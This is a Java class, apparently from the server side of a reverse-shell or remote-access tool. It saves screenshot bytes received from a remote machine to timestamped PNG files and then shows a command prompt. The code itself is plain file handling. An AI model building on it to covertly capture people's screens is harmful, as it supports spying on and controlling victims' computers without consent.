package obs1d1anc1ph3r.reverseshell.server;

import java.io.*;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ReceiveScreenShot {

    private static final String SCREENSHOT_DIR = "screenshots";

    public void receiveScreenshotData(byte[] imageBytes) {
        saveScreenshot(imageBytes);
    }

    private void saveScreenshot(byte[] imageBytes) {
        try {
            Path saveDir = Paths.get(SCREENSHOT_DIR);
            if (Files.notExists(saveDir)) {
                Files.createDirectories(saveDir);
                System.out.println("[INFO] Created directory for screenshots: " + saveDir.toAbsolutePath());
            }

            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            Path screenshotFile = saveDir.resolve("screenshot_" + timestamp + ".png");

            Files.write(screenshotFile, imageBytes);
            System.out.println("[INFO] Screenshot saved at: " + screenshotFile.toAbsolutePath());
            System.out.print("[-] Command> ");

        } catch (IOException ex) {
            System.err.println("[ERROR] Failed to save screenshot: " + ex.getMessage());
            ex.printStackTrace();
        }
    }
}
